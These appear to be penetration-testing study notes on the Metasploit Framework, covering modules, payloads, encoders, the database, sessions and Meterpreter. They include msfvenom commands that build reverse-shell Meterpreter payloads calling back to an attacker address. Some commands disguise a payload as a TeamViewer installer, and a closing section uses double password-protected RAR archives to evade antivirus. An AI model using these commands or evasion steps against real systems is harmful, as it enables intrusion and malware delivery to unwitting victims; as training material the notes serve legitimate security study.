## Metasploit Framework

### Architecture
* Base files in most OS's under `/usr/share/metasploit-framework`

### Engagement Structure
* Enumeration
* Preparation
* Exploitation
* Privilege Escalation
* Post-Exploitation

### Modules
* `<No.> <type>/<os>/<service>/<name>`
* Types
  * **Auxiliary**:	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
  * **Encoders**:	Ensure that payloads are intact to their destination.
  * **Exploits**:	Defined as modules that exploit a vulnerability that will allow for the payload delivery.
  * **NOPs**:	(No Operation code) Keep the payload sizes consistent across exploit attempts.
  * **Payloads**:	Code runs remotely and calls back to the attacker machine to establish a connection (or shell).
  * **Plugins**:	Additional scripts can be integrated within an assessment with msfconsole and coexist.
  * **Post**:	Wide array of modules to gather information, pivot deeper, etc.
* Search through ms via `search` keyword
* See selected module option via `show options` keyword
* See information about a selected module via `info` keyword
* Use `set` or `setg` keyword to set (permanent) options

### Targets
* Use the `show targets` keyword to list available Targets for a selected modules
* Identify a target
  1. Obtain a copy of the target binaries
  2. Use msfpescan to locate a suitable return address

### Payloads
* Types
  1. Singles
  2. Stagers
  3. Stages
* `/` in payload name represents if it's staged
  * `windows/shell_bind_tcp` is a single payload with no stage
  * `windows/shell/bind_tcp` consists of stager `bind_tcp` and stage `shell`
* **Singles**
  * Contains exploit and entire shell-code
  * Self-contained payloads
  * Sole object sent and executed on target
  * Results immediately after running
* **Stagers**
  * Work with Stage payloads to perform specific tasks
  * When Stage complets its run on remote host
    * Stager waiting on attacker machine, ready to establish a connection to victim
  * Usually used to set up network connection between attacker and victim
    * Small and reliable
* **Stages**
  * Payload components downloaded by stager's Modules
  * Provice advanced features with no size limits
    * Meterpreter, VNC Injection etc.

#### Staged Payloads
* Simply put an exploitation process
* **Stage 0**
  * represents initial shell-code sent over the network to target service
  * Sole purpose is to initialize a connection back to attacker (reverse connection)
    * Less likely to trigger prevention systems
  * Common names `reverse_tcp`, `reverse_https`, and `bind_tcp`

#### Meterpreter Payload
* Specific type of multi-faceted payload that uses `DLL Injection` to ensure stable connection
* Hard to detect by simple checks, persistent across reboots or system changes
* Resides completely in the memory, no traces on hard drive
* Scrips and plugins can be `loaded and unloaded` dynamically as required  

#### Searching for payloads
* Use the `show payloads` keyword in `msfconsole`
* Make use of `grep` inside `msfconsole` to filter specific items

#### Set Payloads
* Use the `set payload <no.>` keyword
* `LHOST` and `LPORT`, our local IP and Port for the reverse connection
* `RHOST` and `RPORT`, IP and Port of the victim
* Use the `options` keyword to show more options

#### MSF - Meterpreter Commands
* Use the `shell` keyword in a `meterpreter` session to spawn a CLI of the target host
* Use the `help` keyword to show all Commands

#### Payload Types
* **generic/custom**	Generic listener, multi-use
* **generic/shell_bind_tcp**	Generic listener, multi-use, normal shell, TCP connection binding
* **generic/shell_reverse_tcp**	Generic listener, multi-use, normal shell, reverse TCP connection
* **windows/x64/exec**	Executes an arbitrary command (Windows x64)
* **windows/x64/messagebox**	Spawns a dialog via MessageBox using a customizable title, text & icon
* **windows/x64/shell_reverse_tcp**	Normal shell, single payload, reverse TCP connection
* **windows/x64/shell/reverse_tcp**	Normal shell, stager + stage, reverse TCP connection
* **windows/x64/shell/bind_ipv6_tcp**	Normal shell, stager + stage, IPv6 Bind TCP stager
* **windows/x64/meterpreter/$**	Meterpreter payload + varieties above
* **windows/x64/powershell/$**	Interactive PowerShell sessions + varieties above
* **windows/x64/vncinject/$**	VNC Server (Reflective Injection) + varieties above
* Other heavily used types **Empire** and **Cobalt Strike**

### Encoders
* Change Payloads so they run on differs OS's
  * `x64`, `x86`, `sparc`, `ppc`, `mips`
* Remove bad characters from payloads
* Encodings can sometimes help to evade AV detection
* `Shikata Ga Nai (SGN)` one of the most used schemes
  * Hard to detect the Payloads

#### Selecting an Encoder
* Use the `show encoders` keyword to show encoders for an existing payload
* Old fashion way (before 2015)
  * `msfpayload` and `msfencode` located in `/usr/share/framework2/`
  * Create custom payload trough `msfpayload` and pipe it (`|`) to encoding `msfencode `
    * `msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai`
* Newer method (after 2015)
  * updates combined `msfpayload` and `msfencode` to `msfvenom`
    * `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`

#### Generating Payload - With Encoding
* Use multiple iterations of same encoding to hide the payload better
  * `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe`
* Use `msf-virustotal` to further analyze the payload (free API-Key needed)
  * `msf-virustotal -k <API key> -f TeamViewerInstall.exe`

### Databases
* Msfconsole has built-in support for `PostgreSQL`

#### Setting up the Database
* Check if PostgreSQL server is up and running
  * `sudo service postgresql status`
* Start PostgreSQL
  * `sudo systemctl start postgresql`

#### MSF - Initiate a Database
* `sudo apt update && sudo msfdb init`
* Check the status
  * `sudo msfdb status`

#### MSF - Reinitiate the Database
* To change password of an existing Database
```bash
$ msfdb reinit
$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
$ sudo service postgres restart
$ msfconsole -q
```

#### MSF - Connect to the Initiated Database
* `sudo msfdb run`

#### Using the Database
* Workspaces
  * Like a folder in a project
  * Segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain
  * Use the `workspace` keyword to display the current Workspace list
    * Add `-a` or `-d` to add or delete that workspace
  * The default Workspace is called `default` and is in use indicated by the `*` symbol
  * Use the `workspace [name]` keyword to switch Workspaces
  * Use the `workspace -h` keyword to show more options

#### Importing Scan Results
* Import Nmap (.xml) scan of a host into the Database's Workspace
  * Use `db_import <filename> [file2 ..]`
* After import check with `hosts` and `services` for information

#### Using Nmap inside MSFconsole
* `msf6 > db_nmap -sV -sS 10.10.10.8`

#### Data Backup
* Use `db_export -f <format> [filename]` to save the results after a session
* This data can be imported back later to resume

#### Hosts and Services
* Use `hosts -h` or `services -h` to see more options

#### Credentials
* Use `creds` to visualize gathered credentials during interactions with host
* We can also add credentials manually
* Use `creds -h` to see more options

#### Loot
* Loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more
* Use `loot -h` to see more options

### Using Plugins
* Ensure correct installation
  * `ls /usr/share/metasploit-framework/plugins`

#### MSF - Load Nessus
* `msf6 > load nessus`
* Use the `nessus_help` keyword to see more options
* If plugin not installed correctly
  * `load Plugin_That_Does_Not_Exist`

#### Installing new Plugins
* New popular plugin installed with updates
* To install custom plugins
  * Take provided `.rb` file and copy it in `/usr/share/metasploit-framework/plugins`
* Load installed plugins
  * `msf6 > load plugin_name`

### Sessions
* Background the session with `[CTRL] + [Z]` or type `background`
* Use the `sessions` keyword to list available sessions
* Use the `sessions -i [no.]` to go back into a running session

#### Jobs
* E.g if we run `exploit` we can run it as a job by appending `-j`
* This helps when we want to use a single port for different things  

### Meterpreter
* Uses DLL injection to ensure stable connection
* Stealthy
  * Entirely in memory on target machine
  * No new processes created
  * Process migration to other running processes
  * AES Encrypted
* Powerfull
* Extensible
* Use `post/multi/recon/local_exploit_suggester` to find interesting vulnerabilities
* Or do a hashdump by using the `hashdump` keyword

### Searchsploit
* Use `searchsploit -t Nagios3 --exclude=".py"` to filter for ruby files only
* Place files in corresponding folder   
  * Use only snake-case, alphanumeric characters, and underscores instead of dashes
  * `/usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb`
* Load the module
  * `msfconsole -m /usr/share/metasploit-framework/modules/`
  * Or launch msfconsole and use `reload_all`

### Evasion Techniques
* Hide the payload in a normal programm and continue its execution with `-k`
  * `msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5`

#### Archives
* `msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5`
* `cat test.js`

```bash
�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
<...SNIP...>
�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
```

* Virustotal will detect this file as a threat
* If archived twice, protected with a password, and removing the extension

```bash
# Archiving the Payload
$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
$ rar a ~/test.rar -p ~/test.js

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK
Done

$ ls
test.js   test.rar

# Removing the .RAR Extension
mv test.rar test
ls
test   test.js

# Archiving the Payload Again
rar a test2.rar -p test
Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK
Done

# Removing the .RAR Extension
mv test2.rar test2
ls
test   test2   test.js
```
* Virustotal wont detect this as a virus
